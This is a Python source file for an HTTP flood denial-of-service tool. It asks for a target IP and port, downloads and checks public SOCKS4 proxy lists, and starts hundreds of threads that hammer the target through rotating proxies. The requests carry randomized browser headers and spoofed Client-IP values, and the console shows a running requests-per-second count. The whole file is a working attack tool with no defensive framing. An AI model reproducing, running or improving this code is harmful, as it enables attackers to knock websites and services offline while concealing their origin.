#code by HKquiet
#from math import trunc
from math import trunc
import os
import time
from typing import List
import requests
import sys
import socks
import random
import threading
import socket

userag = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/81.0.4044.62 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/81.0.4044.62 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/81.0.4044.62 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36"
]
acept = [
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
]
refer = [
    'https://www.google.com/',
    'https://www.youtube.com/',
    'https://www.dstat.cc/',
    'https://www.check-host.net//',
    'https://www.discord.com/',
    'https://www.rrcs-67-79-47-3.sw.biz.rr.com/',
    'https://www.facebook.com/',
    'https://www.instagram.com/',
    'https://www.bing.com/',
    'https://www.virtualbox.org/',
    'https://www.vedbex.com/',
    'https://www.github.com/',
    'https://www.whatsapp.com/',
    'https://www.google.com/maps/search/',
    'https://www.kail.org/']
lock = threading.RLock()
def clear():
    if os.name == 'nt':
        return os.system('cls')
    elif os.name == 'posix':
        return os.system('clear')
    else:return print('\n'*200)

def main():
    """main"""
    global target
    global port
    global thr
    global proxies
    global mode
    global thlist
    global CpOutPutKill
    global proxiesChecked

    target = input("Target ip:")
    if target == "":
        main()
        return
    mode = input('Mode[post,head,get,connect](default=post):')
    if mode == '' or 'post':mode = 'POST'
    elif mode == 'head':mode = 'HEAD'
    elif mode == 'get':mode = 'GET'
    elif mode == 'connect':mode = 'CONNECT'
    else: return
    port = input("Port(default=80):")
    if port == '':port = 80
    thr = input("Threads(default=500):")
    if thr == '':thr = 500
    getnewproxies = input("Do you want to get a new socks List?(default=y)(y/n)")
    if getnewproxies == "y" or getnewproxies == '':get_new_proxies()
    proxies = open("proxy.txt").readlines()
    print("There are {} proxies".format(str(len(proxies))))
    ifCheckProxies = input("Do you want to check whether the proxies can work?(default=y)(y/n)")
    thlist = []
    if ifCheckProxies == "y" or ifCheckProxies == "":
        CpOutPutKill = False
        proxiesChecked = 0
        threading.Thread(target=output,args=(True,)).start()
        proxies1 = proxies.copy()
        for i in range(len(proxies1)):
            while True:
                try:
                    proxy = proxies1[i].strip().split(":")
                    th = threading.Thread(target=checkProxies, args=(proxy,i))
                    thlist.append(i)
                    th.start()
                    break
                except RuntimeError:
                    continue
        while True:
            if len(thlist) == 0:
                CpOutPutKill = True
                break
        print("There are {} proxies worked".format(str(len(proxies))))
    startatk()

def get_new_proxies():
    """get new proxies"""
    newproxies = requests.get("https://www.proxyscan.io/download?type=socks4")
    with open("proxy.txt", "wb") as write:
        write.write(newproxies.content)
        time.sleep(0.1)
        print("success get new proxies")

def checkProxies(proxy,th):
    global proxies
    global thlist
    global proxiesChecked
    CountError = 0
    for i in range(3):
        try:
            s = socks.socksocket()
            s.settimeout(5)
            s.set_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]))
            s.connect((str(target), int(port)))
            sended = s.send(str.encode("GET / HTTP/1.1\r\n\r\n".format(str(mode))))
            if not sended:
                CountError += 1
            s.close()
        except:
            CountError += 1
    lock.acquire()
    if CountError == 3:
        proxies.remove(proxy[0]+':'+proxy[1]+"\n")
    thlist.remove(th)
    proxiesChecked += 1
    lock.release()

def startatk():
    global Rps
    global proxyChanged
    Rps = 0
    proxyChanged = 0
    """start atk"""
    threads = []
    for i in range(int(thr)):
        try:
            th = threading.Thread(target=atk, args=(str(i + 1),))
            threads.append(th)
            sys.stdout.write("{} threads was created\r".format(str(i + 1)))
        except RuntimeError:
            return
    input("\nPress a key to start flooding...")
    clear()
    for n in threads:
        try:
            n.start()
        except RuntimeError:
            return
    output(False)
    

def atk(thrNum):
    global Rps
    global proxyChanged
    """attack server"""
    proxy = random.choice(proxies).strip().split(":")
    errorproxy = 0
    while True:
        if errorproxy > 10:
            proxy = random.choice(proxies).strip().split(":")
            #sys.stdout.write("[Proxy Timeout] Thread No.{} has changed proxy...                                                    \n\r".format(thrNum))
            proxyChanged += 1
            errorproxy = 0
        try:
            s1 = socks.socksocket()
            s1.set_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]))
            host = "{} /?=qwertyuiopasdfghjklzxcvbnm&{} HTTP/1.1\r\nHost: {}\r\n".format(str(mode), str(str(random.randint(1, 30000000000))),target)
            useragent = "User-Agent: {}\r\n".format(random.choice(userag))
            accept = random.choice(acept)
            referer = "Referer: {}\r\n".format(str(refer))
            #data += "Cookie: sid={}; path=/; status=enable;\r\n".format(str(random.randint(1000000000000, 9000000000000)), )
            #data += "Cache-Control: no-store\r\n"
            #data += "Content-Length: {}\r\n".format(str(len(dat)))
            #XForwordFor = "X-Forwarded-For: {}.{}.{}.{}\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
            clientIP = "Client-IP: {}.{}.{}.{}\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)),str(random.randint(1, 255)))
            #data += "Forwarded: by={}.{}.{}.{}; for={}.{}.{}.{};\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
            connection = "Connection: Keep-Alive\r\n\r\n"
            #data += "{}\r\n\r\n".format(dat)
            data = host + useragent + accept + referer + clientIP + connection
            s1.connect((str(target), int(port)))
            sended = s1.send(str.encode(data))
            if not sended:
                errorproxy += 1
                continue
            lock.acquire()
            Rps += 1
            lock.release()
            #sys.stdout.write("floodling [ {}:{} ] <==========(RPS:{})[ {}:{} ]                 \r".format(str(target), str(port),str(Rps) , str(proxy[0]), str(proxy[1])))
            try:
                for i in range(200):
                    try:
                        host = "{} /?=qwertyuiopasdfghjklzxcvbnm&{} HTTP/1.1\r\nHost: {}\r\n".format(str(mode), str(str(random.randint(1, 30000000000))),target)
                        data = host + useragent + accept + referer + clientIP + connection
                        sended = s1.send(str.encode(data))
                        if not sended:
                            break
                        lock.acquire()
                        Rps +=1
                        lock.release()
                    except:
                        break
                s1.close()
                #sys.stdout.write("floodling [ {}:{} ] <==========(RPS:{}) [ {}:{} ]             \r".format(str(target), str(port), str(Rps), str(proxy[0]), str(proxy[1])))
            except:
                s1.close()
        except KeyboardInterrupt:
            s1.close()
            exit(1)
        except:
            errorproxy += 1
            s1.close()

def output(cp):
    if cp:
        global CpOutPutKill
        global proxiesChecked
        while not CpOutPutKill:
            time.sleep(0.1)
            sys.stdout.write("[*]Proxies checked: {}\r".format(str(proxiesChecked)))
    else:
        global Rps
        global proxyChanged
        while True:
            time.sleep(1)
            print("flooding [ {}:{} ](Rps:{}) {} proxy changed ".format(str(target), str(port), str(Rps), str(proxyChanged)))
            Rps = 0
            proxyChanged = 0

if __name__ == "__main__":
    print('''##################################################################################################
#                                                                                                #
#                            //////-`                        -s.                                 #          
#                           `Nm///+hm/                       +M:                 .s.             #
#         `/+++-    ./++/.  `Nh     Nm    -+++/.     -+++:`  +M:  .:-   -+++:`  .oM+:-           #
#        +Ny::/ms `sNo::om/ `Nd..-:sm/  .hm+-:oNo  -dd/::yd. +M:`+ms` .dd/-:hm- -oMo::           #
#       -Ms       +M/    `  `NmsshNy`   yM.    +M/ dN`    `  +Msmh.   hMo+++oNd  :M-             #
#       -Ms       +M/       `Nh   .dm-  hM`    +M+ mm`       +My+N+   hM------.  :M:             #
#        oNs:.:yh``yN+-./do `Nh    `mN- .dd/..+Ny` -md/--om- +M: -mh. -md/..:h+  :M+.-           #
#         .+sso:`   -+sso-  `+/     .+/   :oss+-    `:oss+.  -o.  `++` `:oss+-    /so/           #
#                                                                                                #
##################################################################################################''')
    main()
